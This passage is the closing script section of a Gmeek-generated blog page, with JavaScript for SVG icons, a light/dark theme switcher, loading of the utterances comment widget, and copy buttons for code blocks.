0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

let themeSettings={
    "dark": ["dark","moon","#00f0ff","dark-blue"],
    "light": ["light","sun","#ff5000","github-light"],
    "auto": ["auto","sync","","preferred-color-scheme"]
};
function changeTheme(mode, icon, color, utheme){
    document.documentElement.setAttribute("data-color-mode",mode);
    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
    document.getElementById("themeSwitch").parentNode.style.color=color;
    if(utterancesLoad==1){utterancesTheme(utheme);}
}
function modeSwitch(){
    let currentMode=document.documentElement.getAttribute('data-color-mode');
    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
    localStorage.setItem("meek_theme", newMode);
    if(themeSettings[newMode]){
        changeTheme(...themeSettings[newMode]);
    }
}
function utterancesTheme(theme){
    const message={type:'set-theme',theme: theme};
    const iframe=document.getElementsByClassName('utterances-frame')[0];
    iframe.contentWindow.postMessage(message,'https://utteranc.es');
}
if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","binghey/blog");
    script.setAttribute("issue-term","title");
    
    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
    else{script.setAttribute("theme","preferred-color-scheme");}
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>


</html>
